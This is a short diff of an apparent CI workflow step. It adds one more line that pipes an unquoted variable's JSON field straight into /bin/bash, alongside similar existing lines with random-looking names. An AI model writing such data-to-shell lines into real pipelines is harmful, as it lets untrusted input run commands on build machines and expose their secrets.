@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$nrdou273" | jq -r .q06965 | /bin/bash
           printf '%s' "$xl9" | jq -r .hlmuu264 | /bin/bash
           printf '%s' "$bnbf9003" | jq -r .mlz7474 | /bin/bash
+          echo $xqlak7 | jq -r .dxhgg04 | /bin/bash
 
       - name: Store artifact
         if: always()
